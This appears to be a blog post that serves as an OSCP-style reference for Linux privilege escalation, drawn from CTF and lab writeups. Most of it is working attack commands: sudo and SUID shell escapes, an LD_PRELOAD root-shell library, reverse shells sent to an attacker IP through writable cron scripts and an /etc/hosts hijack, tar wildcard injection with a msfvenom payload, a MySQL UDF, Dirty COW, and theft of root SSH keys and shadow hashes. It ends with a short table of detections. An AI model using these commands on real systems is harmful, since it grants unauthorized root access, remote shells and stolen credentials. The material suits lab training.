---
title: "Linux Privilege Escalation — Complete Writeup Analysis (OSCP Edition)"
date: 2026-03-07
description: "A comprehensive Linux privilege escalation reference distilled from 60+ TryHackMe, HackTheBox, and Proving Grounds writeups. Covers sudo abuse, SUID, capabilities, cron jobs, kernel exploits, LXD escape, and more — with real machine examples and detection notes."
categories: [TechBlog]
tags: [linux, privilege-escalation, suid, sudo, capabilities, cron, lxd, kernel-exploit, oscp, pentest, gtfobins]
mermaid: true
content_lang: en
alt_ja: /posts/tech-linux-privesc-guide-ja/
---

## TL;DR

Linux privilege escalation is consistently the decisive phase in CTF machines and OSCP labs. After gaining a low-privilege foothold, the path to root typically runs through one of the patterns below. This guide distills the techniques that appear most frequently across 60+ writeups.

| Category | Techniques |
|---|---|
| Enumeration | LinPEAS, LinEnum, manual checklist |
| sudo abuse | NOPASSWD GTFOBins, LD_PRELOAD, writable scripts, service path traversal |
| SUID abuse | find, gdb, python, php, strace, base64, systemctl, bash |
| Capabilities | cap_setuid (python2/3), cap_net_admin |
| Cron jobs | Writable script, wildcard injection (tar), DNS hijack + curl pipe bash, vulnerable tool CVE |
| File permission | Writable /etc/passwd, readable /etc/shadow |
| Service abuse | MySQL UDF, running-as-root services |
| Container escape | LXD/LXC, Docker group |
| disk group | debugfs → read raw device → SSH key extraction |
| Credential reuse | Config files, service DBs, pspy + credential harvest |
| Kernel exploits | Dirty COW (CVE-2016-5195), others |
| Misc | NFS no_root_squash, PATH hijacking |

---

## The Mental Model

```mermaid
flowchart TD
    A["Low-privilege shell\n(www-data / user)"]

    subgraph ENUM["🔍 Enumerate"]
        E1["sudo -l"]
        E2["find / -perm -4000"]
        E3["getcap -r / 2>/dev/null"]
        E4["cat /etc/crontab"]
        E5["LinPEAS / LinEnum"]
    end

    subgraph PATH["⬆️ Escalation Paths"]
        P1["sudo GTFOBins"]
        P2["SUID binary"]
        P3["Capability abuse"]
        P4["Cron job hijack"]
        P5["Kernel exploit"]
        P6["LXD / Docker"]
    end

    ROOT["Root shell 🏁"]

    A --> ENUM
    ENUM --> PATH
    P1 & P2 & P3 & P4 & P5 & P6 --> ROOT

    style A fill:#c0392b,color:#fff
    style ROOT fill:#27ae60,color:#fff
```

---

## Quick Decision Matrix

| Vector | Detection command | Exploitability | Seen in |
|---|---|---|---|
| sudo NOPASSWD | `sudo -l` | Instant if GTFOBins binary | Simple CTF, Jordak, BBScute, Daily Bugle, Sunday, StuxCTF |
| SUID abuse | `find / -perm -4000 -type f` | One-liner via GTFOBins | Gaara, Astronaut, Image, Jarvis, Linux PrivEsc |
| cap_setuid | `getcap -r / 2>/dev/null` | One-liner (python/perl) | Levram, Katana |
| Cron writable | `cat /etc/crontab; ls -la <script>` | Append reverse shell | GlasgowSmile, Law, Ochima, Funbox, Solidstate |
| Cron wildcard | `cat /etc/crontab` | File-name injection | Linux PrivEsc, Cockpit, Funboxeasyenum |
| Cron DNS hijack | `cat /etc/crontab` + check `/etc/hosts` | /etc/hosts + curl pipe bash | Overpass |
| Cron + tool CVE | `cat /etc/crontab` + tool version | RCE via tool vuln | HTB Pilgrimage (binwalk) |
| LXD group | `id` → `lxd` group | Container mount to /mnt/root | Tabby |
| disk group | `id` → `disk` group | debugfs → raw device read | Extplorer, Fanatastic |
| MySQL UDF | Running as root, plugin dir writable | Custom .so → RCE | Linux PrivEsc |
| Dirty COW | `uname -r` (< 4.8.3) | Race condition overwrite | Linux PrivEsc, Driftingblue6 |
| LD_PRELOAD | `sudo -l` env_keep | Inject .so into sudo process | Linux PrivEsc |
| Readable shadow | `ls -la /etc/shadow` | Offline hash crack (john) | Linux PrivEsc |
| Credential reuse | Config files, service DBs | su / SSH with found password | Codo, Fired, Btrsys2, Mr Robot, Mantis |

---

## Phase 0 — Enumeration

Before trying any technique, always enumerate thoroughly. Missing a single SUID bit or cron job is the most common reason people get stuck.

### Manual Checklist

```bash
# 1. Who am I?
id && whoami && groups

# 2. sudo rights
sudo -l

# 3. SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID

# 4. Linux Capabilities
getcap -r / 2>/dev/null

# 5. Cron jobs
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/

# 6. Writable files owned by root
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v " "

# 7. Kernel version
uname -r

# 8. Users and passwords
cat /etc/passwd
cat /etc/shadow 2>/dev/null

# 9. Network services running as root
ps aux | grep root
ss -tlnp
```

### Automated Tools

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/

# linux-exploit-suggester-2
perl linux-exploit-suggester-2.pl
```

> **Workflow**: Always run `sudo -l` and `getcap` manually first — these take seconds and cover the two highest-yield vectors. Then run LinPEAS for anything deeper.

---

## 1. sudo Misconfiguration

### 1a. NOPASSWD + GTFOBins Binary

The most common quick win. `sudo -l` reveals a binary the user can run as root without a password — and that binary appears on [GTFOBins](https://gtfobins.github.io/).

```bash
# Check sudo rights
sudo -l

# Example output:
# User mitch may run the following commands:
#   (root) NOPASSWD: /usr/bin/vim
```

Common binaries and their escape commands:

| Binary | Command | Seen in |
|---|---|---|
| `vim` | `sudo vim -c ':!/bin/bash'` or `:!bash` in command mode | [Simple CTF](/posts/thm-simple-ctf/) |
| `find` | `sudo find . -exec /bin/sh \; -quit` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
| `env` | `sudo env /bin/bash` | [Jordak](/posts/pg-jordak/) |
| `nano` | `sudo nano`, then `^R^X` → `reset; sh 1>&0 2>&0` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
| `less` | `sudo less /etc/passwd`, then `!/bin/bash` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
| `python` | `sudo python -c 'import os; os.system("/bin/bash")'` | Multiple |
| `bash` | `sudo bash` | [StuxCTF](/posts/thm-stuxctf/) |
| `wget` | `TF=$(mktemp); echo '#!/bin/sh\n/bin/bash' > $TF; chmod +x $TF; sudo wget --use-askpass=$TF http://127.0.0.1` | [HTB Sunday](/posts/htb-sunday/) |
| `yum` | `TF=$(mktemp -d); echo $'[main]\nplugins=1' > $TF/yum.conf; echo $'[id]\nname=p\nplugin_path='$TF'\n[...]' > ...; sudo yum -c $TF/yum.conf` | [Daily Bugle](/posts/thm-daily-bugle/) |
| `hping3` | `sudo hping3 --icmp target`, then at `hping3>` prompt: `/bin/sh -p` | [BBScute](/posts/pg-bbscute/) |
| `strace` | `sudo strace -o /dev/null /bin/sh -p` | [Image](/posts/pg-image/) (SUID) |

```mermaid
flowchart LR
    A["sudo -l reveals\nNOPASSWD: /usr/bin/vim"]
    B["sudo vim -c ':!/bin/bash'"]
    C["Shell spawned as root\n(vim forks /bin/bash without\ndropping privileges)"]

    A --> B --> C

    style C fill:#27ae60,color:#fff
```

### 1b. Writable Script in sudo Rule

Sometimes the binary is a **custom script** that the user can write to:

```bash
# sudoers: (root) NOPASSWD: /opt/scripts/mysql-backup.sh
# But the script uses unquoted variables — bash comparison bypass

sudo /opt/scripts/mysql-backup.sh
# Enter the password prompt and provide a wildcard → comparison bypass
```

Real case: [HTB Codify](/posts/htb-codify/) — `mysql-backup.sh` performed an unquoted bash string comparison that could be bypassed with `*`, leading to root password disclosure.

### 1c. LD_PRELOAD (env_keep)

If `sudo -l` shows `env_keep+=LD_PRELOAD`, a malicious shared library can be injected into any sudo command:

```bash
# Compile a shared library that spawns a root shell
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Run any sudo-allowed binary with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find
```

Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)

### 1d. sudo service — Path Traversal

If `sudo /usr/sbin/service` is allowed without a password, the service name argument can be used as a path traversal to execute an arbitrary binary:

```bash
# sudoers: (root) NOPASSWD: /usr/sbin/service
sudo /usr/sbin/service ../../bin/bash
# Root shell
```

The `service` command ultimately calls `/etc/init.d/<arg>` — by injecting `../../bin/bash` as the argument, execution reaches `/bin/bash` as root.

Seen in: [Crane](/posts/pg-crane/)

---

## 2. SUID Abuse

When a binary has the SUID bit set, it runs as its owner (usually root) regardless of who executes it.

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

```mermaid
flowchart TD
    A["find / -perm -4000 -type f"]
    B{"Binary in GTFOBins?"}
    C["One-liner → root shell"]
    D["Check for version-specific exploits"]

    A --> B
    B -- Yes --> C
    B -- No --> D

    style C fill:#27ae60,color:#fff
```

### Common SUID Exploits

**`find` with SUID:**
```bash
find . -exec /bin/sh -p \; -quit
# -p: preserve effective UID (do not drop root)
```

**`gdb` with SUID** ([Gaara](/posts/pg-gaara/)):
```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

**`python` with SUID:**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**`base64` with SUID** — read any file as root ([Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/)):
```bash
base64 /etc/shadow | base64 --decode
```

**`systemctl` with SUID** ([Jarvis](/posts/htb-jarvis/)):
```bash
# Create a malicious service unit
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
# Then: /bin/bash -p
```

**`php` with SUID** ([Astronaut](/posts/pg-astronaut/)):
```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

**`strace` with SUID** ([Image](/posts/pg-image/)):
```bash
strace -o /dev/null /bin/sh -p
# strace runs as root (SUID), spawns /bin/sh inheriting root
```

**`hping3` with SUID:**
```bash
# At the hping3 interactive prompt:
hping3
hping3> /bin/sh -p
```

> **Reference**: Always check [GTFOBins](https://gtfobins.github.io/) for every unusual SUID binary. The project catalogs hundreds of abuse paths.

---

## 3. Linux Capabilities

Capabilities are a fine-grained privilege mechanism. `cap_setuid=ep` on a binary is effectively equivalent to SUID — it allows the process to change its UID to 0.

```bash
getcap -r / 2>/dev/null
# Example output:
# /usr/bin/python3.10 = cap_setuid+ep
# /usr/bin/python2.7  = cap_setuid+ep
# /usr/bin/ping       = cap_net_raw+ep
```

```mermaid
sequenceDiagram
    participant U as Low-privilege user
    participant P as python3 (cap_setuid)
    participant S as /bin/bash

    U->>P: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    Note over P: cap_setuid allows setuid(0)
    P->>S: os.system("/bin/bash")
    S->>U: Root shell (#)
```

**One-liner:**
```bash
# python with cap_setuid
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Seen in: [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/)

| Capability | Implication |
|---|---|
| `cap_setuid` | Can setuid(0) → full root escalation |
| `cap_net_raw` | Raw socket access (packet sniffing, ARP spoofing) |
| `cap_dac_override` | Bypass file read/write permission checks |
| `cap_sys_admin` | Near-root: mount, syslog, etc. |

---

## 4. Cron Job Exploitation

Cron jobs run as root but may execute files that low-privilege users can modify.

```bash
cat /etc/crontab
# Example:
# * * * * * root /opt/cleanup.sh
```

### 4a. Writable Script

If the cron script is writable, append a reverse shell payload:

```bash
ls -la /opt/cleanup.sh
# -rwxrwxr-x root root /opt/cleanup.sh   ← writable by others!

echo 'busybox nc 10.10.14.5 4444 -e /bin/bash' >> /opt/cleanup.sh
nc -nlvp 4444
# Wait for cron to fire → root shell
```

Seen in: [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/)

### 4b. Wildcard Injection (tar)

If a cron script runs `tar cf /backup.tar *` in a writable directory, filenames starting with `--` are interpreted as tar options:

```bash
# Target cron: tar cf /backup/archive.tar /home/user/*

# Create a reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Create fake "option" files
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=shell.elf'

# Wait for cron → root reverse shell
nc -nlvp 4444
```

Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/), [Cockpit](/posts/pg-cockpit/), [Funboxeasyenum](/posts/pg-funboxeasyenum/)

```mermaid
sequenceDiagram
    participant CR as cron (root)
    participant TAR as tar
    participant SH as shell.elf

    CR->>TAR: tar cf archive.tar *
    Note over TAR: * expands to all files including<br/>--checkpoint=1<br/>--checkpoint-action=exec=shell.elf
    TAR->>SH: exec shell.elf (as root)
    SH-->>CR: Reverse shell to attacker
```

### 4c. Cron + /etc/hosts DNS Hijack

If a cron job runs `curl http://<hostname>/script.sh | bash` and the hostname is in `/etc/hosts` (writable), you can redirect the curl request to your own server.

```bash
cat /etc/crontab
# * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

# Check /etc/hosts permissions
ls -la /etc/hosts
# -rw-rw-rw- 1 root root /etc/hosts   ← writable!

# Redirect the hostname to attacker IP
echo '10.10.14.5 overpass.thm' >> /etc/hosts

# On attacker: serve a reverse shell
mkdir -p /var/www/html/downloads/src/
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /var/www/html/downloads/src/buildscript.sh
python3 -m http.server 80

nc -nlvp 4444
# Wait for cron → root shell
```

Seen in: [Overpass](/posts/thm-overpass/)

### 4d. Cron + Vulnerable Tool (CVE Abuse)

If a cron job executes a tool with a known CVE, exploit the vulnerability to get RCE as root.

```bash
# cron: * * * * * root /usr/sbin/malwarescan.sh
cat /usr/sbin/malwarescan.sh
# #!/bin/bash
# ... uses binwalk to scan uploaded files

# Check binwalk version
binwalk --help | head -3
# Binwalk v2.3.2   ← CVE-2022-4510 (path traversal RCE)

# Create a malicious PNG with embedded payload
# The CVE allows writing a .so to a known path during extraction
python3 binwalk_CVE-2022-4510.py malicious.png <attacker_ip> <port>
nc -nlvp 4444
# Drop malicious file to the scanned directory, wait for cron
```

Seen in: [HTB Pilgrimage](/posts/htb-pilgrimage/) (binwalk CVE-2022-4510)

---

## 5. Writable /etc/passwd

If `/etc/passwd` is world-writable, add a new root-equivalent user:

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root /etc/passwd   ← writable!

# Generate a password hash
openssl passwd -1 -salt hacker password123
# $1$hacker$...

# Append a new root user (uid=0)
echo 'hacker:$1$hacker$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # enter: password123
```

---

## 6. Readable /etc/shadow → Hash Cracking

If `/etc/shadow` is readable (misconfigured permissions), extract and crack hashes offline:

```bash
ls -la /etc/shadow
# -rw-r--r-- root root /etc/shadow   ← world-readable!

cat /etc/shadow
# root:$6$...long_hash...:18561:0:99999:7:::

echo '$6$...<root_hash>...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# or
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/)

---

## 7. MySQL UDF Exploitation

If MySQL is running as root and you have root credentials (e.g., empty password), a malicious User Defined Function can execute OS commands as root.

```bash
# Connect as MySQL root
mysql -u root

# Load a malicious UDF shared library
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

# Create UDF
create function do_system returns integer soname 'raptor_udf2.so';

# Execute OS command (create SUID bash)
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit

/tmp/rootbash -p
# root shell
```

Compile the UDF:
```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)

---

## 8. LXD / LXC Container Escape

If the current user is in the `lxd` group, they can create a privileged container and mount the host filesystem:

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),116(lxd)

# On attacker machine: build minimal Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine
# Transfer the .tar.gz to target

# On target:
lxd init   # accept all defaults
lxc image import alpine.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Now inside container (as root):
cat /mnt/root/root/root.txt
chroot /mnt/root /bin/bash   # full root shell on host filesystem
```

Seen in: [HTB Tabby](/posts/htb-tabby/)

```mermaid
flowchart LR
    A["User in lxd group"]
    B["Create privileged container\nsecurity.privileged=true"]
    C["Mount host / to /mnt/root"]
    D["lxc exec → container root"]
    E["chroot /mnt/root\n→ host root access"]

    A --> B --> C --> D --> E
    style E fill:#27ae60,color:#fff
```

---

## 9. disk Group — debugfs Raw Device Access

If the current user is in the `disk` group, they can use `debugfs` to read raw block devices — including the root filesystem. This allows direct extraction of files like `/root/.ssh/id_rsa` without filesystem permission checks.

```bash
id
# uid=1000(user) gid=1000(user) groups=1000(user),6(disk)

# List block devices
lsblk
# NAME                      MAJ:MIN RM  SIZE
# sda                         8:0    0   20G  0 disk
# └─ubuntu--vg-ubuntu--lv   253:0    0   20G  0 lvm

# Open the volume with debugfs
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

# Extract root's SSH private key
debugfs: cat /root/.ssh/id_rsa
# -----BEGIN OPENSSH PRIVATE KEY-----
# ...

# Save and use
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```

Seen in: [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/)

---

## 10. Credential Reuse from Config Files

One of the most underrated but frequently successful vectors: applications store plaintext or weakly-hashed credentials in config files. After gaining a low-privilege shell, always grep for passwords.

```bash
# Common config locations
grep -r "password\|passwd\|secret\|credential" /var/www/html/ 2>/dev/null
grep -r "DB_PASS\|db_password\|db_pass" /var/www/ 2>/dev/null
find / -name "*.conf" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# Found a password → try su
su root
su <other_user>

# Try SSH reuse
ssh root@localhost -p 22
```

**Process monitoring with pspy** — catches credentials passed on the command line:
```bash
./pspy64   # or pspy32
# Watch for: mysqldump, cron scripts, scripts with --password= flags
```

Real cases:
- [Codo](/posts/pg-codo/): `/var/www/html/sites/default/config.php` → password `FatPanda123` → `su root`
- [Fired](/posts/pg-fired/): Openfire DB → password → `su root`
- [Btrsys2-1](/posts/pg-btrsys2-1/): direct `su -` with password `roottoor`
- [Mantis](/posts/pg-mantis/): `mysqldump` in pspy → password → pivot to `sudo -l` full access

---

## 11. Kernel Exploits — Dirty COW (CVE-2016-5195)

Kernel exploits are a last resort — noisy and can crash the system. Check the kernel version first.

```bash
uname -r
# 4.4.0 → likely vulnerable to Dirty COW

perl linux-exploit-suggester-2.pl
# → suggests dirtycow, etc.
```

**Dirty COW** exploits a race condition in the copy-on-write mechanism to overwrite any read-only file — including SUID binaries.

```bash
# Download / transfer c0w.c (Dirty COW exploit)
gcc -pthread c0w.c -o c0w
./c0w
# Replaces /usr/bin/passwd with a root-shell binary
/usr/bin/passwd
# Root shell
```

Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)

> **Warning**: Dirty COW can cause kernel panics and data corruption on production systems. Use only in lab/CTF environments.

---

## 12. NFS no_root_squash

If a share is exported with `no_root_squash`, a remote root user can write SUID files to that share:

```bash
# Check exports from the victim
cat /etc/exports
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

# On attacker (as root): mount the NFS share
mount -o rw,vers=2 <victim_ip>:/tmp /mnt/nfs

# Create a SUID shell on the share
cp /bin/bash /mnt/nfs/bash
chmod +xs /mnt/nfs/bash

# On victim:
/tmp/bash -p
# Root shell
```

---

## 13. PATH Hijacking

If a SUID binary or sudo-allowed script calls a command **without an absolute path**, create a malicious binary with the same name in a directory earlier in `$PATH`:

```bash
# Example: SUID binary calls "service apache2 restart"
strings /usr/local/bin/suid-binary | grep -v "^/"
# → "service" (relative path)

# Hijack PATH
mkdir /tmp/hijack
echo '#!/bin/bash\nbash -p' > /tmp/hijack/service
chmod +x /tmp/hijack/service
export PATH=/tmp/hijack:$PATH
/usr/local/bin/suid-binary
# Root shell
```

---

## Privilege Escalation Workflow

```mermaid
flowchart TD
    START["Low-privilege shell obtained"]

    A["sudo -l"]
    B{"NOPASSWD entry?"}
    B1["GTFOBins → instant root"]

    C["find / -perm -4000"]
    D{"Unusual SUID?"}
    D1["GTFOBins → root"]

    E["getcap -r /"]
    F{"cap_setuid?"}
    F1["setuid(0) → root"]

    G["cat /etc/crontab\nls -la scripts"]
    H{"Writable script?"}
    H1["Append payload → root"]

    I["LinPEAS full scan"]
    J["Check kernel version"]
    K["Last resort: kernel exploit"]

    START --> A --> B
    B -- Yes --> B1
    B -- No --> C --> D
    D -- Yes --> D1
    D -- No --> E --> F
    F -- Yes --> F1
    F -- No --> G --> H
    H -- Yes --> H1
    H -- No --> I --> J --> K

    style B1 fill:#27ae60,color:#fff
    style D1 fill:#27ae60,color:#fff
    style F1 fill:#27ae60,color:#fff
    style H1 fill:#27ae60,color:#fff
    style K fill:#e67e22,color:#fff
```

---

## Detection & Hardening (Blue Team)

| Vector | Detection | Mitigation |
|---|---|---|
| sudo GTFOBins | Audit `/etc/sudoers` against GTFOBins list | Remove unnecessary NOPASSWD entries; use command paths, not directories |
| SUID abuse | `find / -perm -4000` baseline + daily diff | Remove SUID from non-essential binaries; use `nosuid` mount options |
| cap_setuid | `getcap -r /` in CI/CD audits | Assign only required capabilities; avoid `cap_setuid` on interpreters |
| Cron hijack | File integrity monitoring on cron scripts | Restrict write permissions; use root-owned, 700-permission scripts |
| LXD escape | Audit group membership; restrict `lxd` group | Remove users from `lxd` group unless required |
| Dirty COW | `uname -r` monitoring; patch management | Apply kernel patches (> 4.8.3 fixed) |

---

## Machine Index by Technique

| Technique | Machines |
|---|---|
| sudo GTFOBins (vim/find/env/nano/less/bash) | [Simple CTF](/posts/thm-simple-ctf/), [Jordak](/posts/pg-jordak/), [StuxCTF](/posts/thm-stuxctf/), [Linux PrivEsc](/posts/thm-linux-privilege-escalation/) |
| sudo GTFOBins (wget/yum) | [HTB Sunday](/posts/htb-sunday/), [Daily Bugle](/posts/thm-daily-bugle/) |
| sudo GTFOBins (hping3/strace) | [BBScute](/posts/pg-bbscute/), [Image](/posts/pg-image/) |
| sudo service path traversal | [Crane](/posts/pg-crane/) |
| sudo writable script | [HTB Codify](/posts/htb-codify/), [HTB Nibbles](/posts/htb-nibbles/), [Jarvis](/posts/htb-jarvis/) |
| sudo LD_PRELOAD | [Linux PrivEsc](/posts/thm-linux-privesc/) |
| SUID gdb | [Gaara](/posts/pg-gaara/) |
| SUID php | [Astronaut](/posts/pg-astronaut/) |
| SUID strace | [Image](/posts/pg-image/) |
| SUID systemctl | [HTB Jarvis](/posts/htb-jarvis/) |
| SUID base64 | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
| SUID find / custom find wrapper | [Nibbles (PG)](/posts/pg-nibbles/), [Mzeeav](/posts/pg-mzeeav/) |
| cap_setuid python | [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/) |
| Cron writable script | [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/), [Ochima](/posts/pg-ochima/), [Funbox](/posts/pg-funbox/), [Flu](/posts/pg-flu/), [HTB Solidstate](/posts/htb-solidstate/) |
| Cron wildcard (tar) | [Linux PrivEsc](/posts/thm-linux-privesc/), [Cockpit](/posts/pg-cockpit/), [Funboxeasyenum](/posts/pg-funboxeasyenum/) |
| Cron DNS hijack (/etc/hosts) | [Overpass](/posts/thm-overpass/) |
| Cron + tool CVE (binwalk) | [HTB Pilgrimage](/posts/htb-pilgrimage/) |
| disk group + debugfs | [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/) |
| Credential reuse from configs | [Codo](/posts/pg-codo/), [Fired](/posts/pg-fired/), [Btrsys2-1](/posts/pg-btrsys2-1/), [Mantis](/posts/pg-mantis/) |
| LXD container escape | [HTB Tabby](/posts/htb-tabby/) |
| MySQL UDF | [Linux PrivEsc](/posts/thm-linux-privesc/) |
| Kernel (Dirty COW) | [Linux PrivEsc](/posts/thm-linux-privesc/), [Driftingblue6](/posts/pg-driftingblue6/) |
| Password hash cracking | [Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |

---

## Key Takeaways

1. **Always start with `sudo -l` and `getcap`** — these are the fastest, highest-yield checks
2. **Cross-reference every unusual SUID/capability/sudo binary with GTFOBins** before writing custom exploits
3. **Cron + writable script = reliable root** — even with no SUID or sudo, check cron permissions
4. **Kernel exploits are a last resort** — noisy, crash-prone, but sometimes the only path
5. **LXD group membership = root** — check `id` for `lxd` or `docker` group membership immediately after getting a shell

---

## References

- [GTFOBins](https://gtfobins.github.io/) — Curated list of Unix binaries for privilege escalation
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng) — Linux Privilege Escalation Awesome Script
- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
- [CVE-2016-5195 (Dirty COW)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)
- [CVE-2022-4510 (binwalk RCE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4510)
- **Related writeups**: [Simple CTF](/posts/thm-simple-ctf/), [Gaara](/posts/pg-gaara/), [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/), [Jordak](/posts/pg-jordak/), [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/), [Ochima](/posts/pg-ochima/), [Funbox](/posts/pg-funbox/), [Overpass](/posts/thm-overpass/), [BBScute](/posts/pg-bbscute/), [Crane](/posts/pg-crane/), [Astronaut](/posts/pg-astronaut/), [Image](/posts/pg-image/), [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/), [Codo](/posts/pg-codo/), [Mantis](/posts/pg-mantis/), [Driftingblue6](/posts/pg-driftingblue6/), [Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/), [HTB Tabby](/posts/htb-tabby/), [HTB Jarvis](/posts/htb-jarvis/), [HTB Codify](/posts/htb-codify/), [HTB Pilgrimage](/posts/htb-pilgrimage/), [HTB Sunday](/posts/htb-sunday/), [Daily Bugle](/posts/thm-daily-bugle/)
- **Related tech posts**: [SUID find Deep Dive](/posts/tech-suid-find-privesc/)
